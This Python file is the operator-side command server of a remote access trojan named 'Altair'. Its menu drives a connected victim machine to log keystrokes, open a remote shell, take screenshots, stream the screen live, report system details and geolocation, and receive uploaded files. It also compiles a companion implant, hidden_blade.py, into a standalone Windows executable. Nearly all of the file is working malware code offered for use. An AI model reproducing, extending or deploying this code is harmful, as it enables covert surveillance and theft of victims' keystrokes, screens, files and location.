from getpass import getuser
from time import sleep, time
from util import versionControl,Console,AltairCommandList
from threading import Thread
from vidstream import StreamingServer
import os
import sys
import socket
import random
import ast
import folium
import PyInstaller.__main__
import shutil

##------------------------------------Global Scope-------------------------------##
banner = f"""
\t\t\t      V{versionControl.v.readLocalVersion["version"]}\t\t\t\t\n
  :::.     .::::::.  .::::::.   :::.     .::::::.  .::::::. ::::::.    :::.
  ;;`;;   ;;;`    ` ;;;`    `   ;;`;;   ;;;`    ` ;;;`    ` ;;;`;;;;,  `;;;
 ,[[ '[[, '[==/[[[[,'[==/[[[[, ,[[ '[[, '[==/[[[[,'[==/[[[[,[[[  [[[[[. '[[
c$$$cc$$$c  '''    $  '''    $c$$$cc$$$c  '''    $  '''    $$$$  $$$ "Y$c$$
 888   888,88b    dP 88b    dP 888   888,88b    dP 88b    dP888  888    Y88
 YMM   ""`  "YMmMY"   "YMmMY"  YMM   ""`  "YMmMY"   "YMmMY" MMM  MMM     YM\n
\t\t\tcoding helmsys
\t\t\t\t~
\t\tgithub: https://github.com/Arif-Helmsys
\t\t     Assassin Name: Altair
"""
ip = "192.168.1.5"
port = 1881
state = False
print(f"{random.choice(Console.SHAKER)}{banner}")
##------------------------------------Global Scope-------------------------------##

class Server(socket.socket):
    def __init__(self) -> None:
        super().__init__(socket.AF_INET,socket.SOCK_STREAM)
        self.bind((ip,port))
        self.listen(1)
        self.terminalUsing()

    def terminalUsing(self):
        global state
        while(state is not True):
            _input = Console._input_(self,f"{Console.CYAN}╭──({Console.BOLD}{Console.PURPLE}assassin@{getuser().lower()}{Console.CYAN}){Console.DEFAULT}{Console.CYAN}\n╰──────{Console.RED}{Console.BOLD}# ")
            if _input == Console.CONNECT:
                state = True

            elif _input == Console.HELP:
                print(Console.HELPER)

            elif _input == Console.MY_SHELL:
                while True:
                    shell = Console._input_(self,f"{Console.CYAN}\t    ├──({Console.BOLD}{Console.PURPLE}assassin@myshell{Console.CYAN}){Console.DEFAULT}{Console.CYAN}\n\t   ╰──────{Console.RED}{Console.BOLD}# ".expandtabs(4))
                    if shell == "e":
                        break
                    else:
                        os.system(shell)    
            elif _input == Console.EXECUTE:
                if not os.path.exists("hidden_blade.exe"):
                    print(f"\t{Console.CYAN}  ╰──/{Console.CYAN}Creating Execute...{Console.DEFAULT}".expandtabs(5))
                    PyInstaller.__main__.run(['hidden_blade.py',"--hidden-import",'pynput.keyboard._win32',"--hidden-import",'pynput.mouse._win32','--onefile','--exclude-module','matplotlib','--exclude-module','scipy'])
                    print(f"\t{Console.CYAN}  ╰──/{Console.CYAN}Execute file created".expandtabs(5))
                    shutil.copy(f"{os.getcwd()}\\dist\\hidden_blade.exe",f"{os.getcwd()}\\hidden_blade.exe")
                    shutil.rmtree("dist")
                    shutil.rmtree("build")
                    os.remove("hidden_blade.spec")
                else:
                    print(f"\t{Console.CYAN}  ╰──/{Console.CYAN}Execute is already Exists\t".expandtabs(5))
            elif _input == Console.SHUTDOWN:
                state = False
                sys.exit(0)
        return self.serverRunning()
    
    def serverRunning(self):
        global state
        Console.loadingAnimation(self)
        sys.stdout.write("\033[F")
        print(f"\n{Console.DEFAULT}{Console.YELLOW}[SERVER]~Server Starded")
        sleep(1)
        print(f"{Console.YELLOW}[SERVER]~Altair is Waiting")
        client_socket, client_address = self.accept()
        while(True):
            if state:
                print(f"{Console.YELLOW}[SERVER]~Altair is Connected")
                state = False
            _input = Console._input_(self,f"{Console.CYAN}╭──({Console.BOLD}{Console.PURPLE}assassin@altair{Console.CYAN}){Console.DEFAULT}{Console.CYAN}\n╰──────{Console.RED}{Console.BOLD}# ")
            if _input == AltairCommandList.HELP:
                print(AltairCommandList.HELPER)

            elif _input == AltairCommandList.KEY_LOGGER:
                print(f"\t{Console.CYAN}  ╰──/{Console.CYAN}Keyboard listening...".expandtabs(5))
                client_socket.send(AltairCommandList.KEY_LOGGER.encode())
                response = client_socket.recv(1024).decode()
                while response != "Finish":
                    response = client_socket.recv(1024).decode()
                with open("logger.txt","w",encoding="utf-8") as f:
                    f.write(client_socket.recv(8192).decode())
                if input(f"\t{Console.CYAN}  ╰──/{Console.CYAN}Open [Y/n] ".expandtabs(5)) == "Y":
                    os.startfile("logger.txt")

            elif _input == AltairCommandList.INCLUDE_SHELL:
                client_socket.send(AltairCommandList.INCLUDE_SHELL.encode())
                while True:
                    c = Console._input_(self,f"{Console.CYAN}\t    ├──({Console.BOLD}{Console.PURPLE}assassin@shell{Console.CYAN}){Console.DEFAULT}{Console.CYAN}\n\t   ╰──────{Console.RED}{Console.BOLD}# ".expandtabs(4))
                    if c == "help":
                        print(AltairCommandList.HELPER_C)
                    elif c == "":
                        print(f"{Console.CYAN}\t      ╰──/{Console.YELLOW}Please No Epmty")
                    else:
                        try:
                            client_socket.send(c.encode())
                            resp = eval(client_socket.recv(4096).decode())
                            byte = ""
                            for i,j in resp.items():
                                byte += i
                            resp_ = client_socket.recv(1024 if int(byte)<1024 else int(byte)).decode()
                            if resp_ == "exited":
                                break
                            else:
                                print("\n".join(f"\t\t{Console.CYAN}╰──/{Console.DEFAULT}{x}".expandtabs(7) for x in resp_.split("\n")))
                                print(byte)
                        except NameError:
                            break

            elif _input == AltairCommandList.SS:
                client_socket.send(AltairCommandList.SS.encode())
                with open("gelen_ss.png","wb") as ssOpen:
                    remaining = int.from_bytes(client_socket.recv(4), 'big')
                    while remaining:
                        rbuf = client_socket.recv(min(remaining, 4096))
                        remaining -= len(rbuf)
                        ssOpen.write(rbuf)
                print(f"\t{Console.CYAN}  ╰──/{Console.CYAN}screenshot saved".expandtabs(5))
            
            elif _input == AltairCommandList.WIN_MAP:
                client_socket.send(AltairCommandList.WIN_MAP.encode())
                while True:
                    _inp = Console._input_(self,f"{Console.CYAN}\t    ├──({Console.BOLD}{Console.PURPLE}assassin@win-map{Console.CYAN}){Console.DEFAULT}{Console.CYAN}\n\t   ╰──────{Console.RED}{Console.BOLD}# ".expandtabs(4))
                    if _inp == "":
                        print(f"{Console.CYAN}\t      ╰──/{Console.YELLOW}Please No Epmty")
                    else:
                        client_socket.send(_inp.encode())
                        recv_cmd = client_socket.recv(1024).decode()
                        if recv_cmd == "exited":
                            break
                        print(recv_cmd)

            elif _input == AltairCommandList.INFO:
                client_socket.send(AltairCommandList.INFO.encode())
                data = ast.literal_eval(client_socket.recv(4096).decode())
                for i,j in data.items():
                    if i == "INFO":
                        sayac = 0
                        while sayac != 9:
                            print(f"\t{Console.CYAN}╰──/{Console.DEFAULT}{[key for key in data.setdefault(i)][sayac]}{Console.CYAN} ⥤ {j[[k for k in j][sayac]]}".expandtabs(7))
                            sayac += 1
                    if i == "SYSTEM":
                        sayac = 0
                        while sayac != 6:
                            try:
                                print(f"\t{Console.CYAN}╰──/{Console.DEFAULT}{[key for key in data.setdefault(i)][sayac]}{Console.CYAN} ⥤ {j[[k for k in j][sayac]]}".expandtabs(7))
                                sayac += 1
                            except IndexError:
                                break

                m = folium.Map(location=[data["INFO"]["Lat"],data["INFO"]["Lon"]])
                folium.Marker(location=[data["INFO"]["Lat"],data["INFO"]["Lon"]], popup = data["INFO"]["IP"]).add_to(m)
                folium.CircleMarker(location=(data["INFO"]["Lat"],data["INFO"]["Lon"]),radius=100, fill_color='blue').add_to(m).save(outfile="altair_is_here.html")
                while True:
                    i = input(f"\t{Console.CYAN}╰──/Opening Location~[Y/n] ".expandtabs(7))
                    if i == "Y":
                        os.startfile("altair_is_here.html")
                        break
                    elif i == "n":
                        break

            elif _input.startswith(AltairCommandList.SEND_FILE):
                client_socket.send(_input.encode())
                splt = _input.split()
                if len(splt) == 2:
                    client_socket.send(splt[1].encode())
                    a = time()
                    with open(os.path.abspath(splt[1].strip()),"rb") as file:
                        data = file.read()
                        data_lenght = len(data)
                        client_socket.send(data_lenght.to_bytes(4,'big'))
                        client_socket.send(data)
                    b = time()
                print(f"\t{Console.CYAN}╰──/The '{splt[1]}' File was sent in {(b-a).__round__(3)} seconds.".expandtabs(7))

            elif _input == AltairCommandList.SCREEN_RECORD:
                try:
                    print(f"\t{Console.CYAN}╰──/X to exit".expandtabs(7))
                    client_socket.send(AltairCommandList.SCREEN_RECORD.encode())
                    self.close()
                    screen = StreamingServer(host=ip,port=port,quit_key="x")
                    t1 = Thread(target=screen.start_server,daemon=True)
                    t1.start()
                except:
                    pass

            elif _input == AltairCommandList.EXIT:
                client_socket.send(AltairCommandList.EXIT.encode())
                print(f"{Console.YELLOW}[SERVER]~Lost connection with Altair")
                return self.terminalUsing()
            
            else:
                print(f"{Console.CYAN}\t╰──/{Console.YELLOW}Unknow Command".expandtabs(12))

def main():
    try:
        Server()
    except:
        pass
if __name__ == "__main__":
    main()
